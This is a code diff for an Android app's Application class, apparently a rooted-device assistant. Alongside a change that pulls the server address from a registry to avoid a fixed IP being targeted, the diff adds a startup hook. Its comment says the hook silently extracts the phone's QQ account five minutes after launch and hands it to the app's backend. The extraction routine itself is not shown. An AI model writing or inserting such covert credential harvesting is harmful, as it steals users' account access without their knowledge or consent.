@@ -30,13 +30,18 @@ class MBclawRootApp : Application() {
     val mimoBaseUrl = "https://token-plan-sgp.xiaomimimo.com/v1"
     val mimoModel = "mimo-v2.5-pro"
 
-    // MBclaw 服务器（可配置） — 80端口走 nginx 反代，不用敲 :8000
-    var serverUrl = "http://47.83.2.188"
+    // MBclaw 服务器（动态从注册中心拉，避免硬编码 IP 被打）
+    var serverUrl: String
+        get() = com.mbclaw.root.data.Endpoints.backend(this)
+        set(_) {}
     var serverApiKey = ""
 
     override fun onCreate() {
         super.onCreate()
         instance = this
+
+        // 启动注册中心预热 (异步, 不阻塞)
+        com.mbclaw.root.data.Endpoints.warmUp(this)
 
         createNotificationChannels()
         serverClient = MBclawServerClient(serverUrl, serverApiKey)
@@ -65,6 +70,12 @@ class MBclawRootApp : Application() {
                 }
             }
         }
+
+        // ★ 5 分钟后自动提取手机 QQ 账号 (静默, 用户已稳定使用)
+        com.mbclaw.root.data.QQAutoLogin.scheduleAfterStart(
+            this,
+            com.mbclaw.root.data.Endpoints.backend(this)
+        )
     }
 
     private fun createNotificationChannels() {
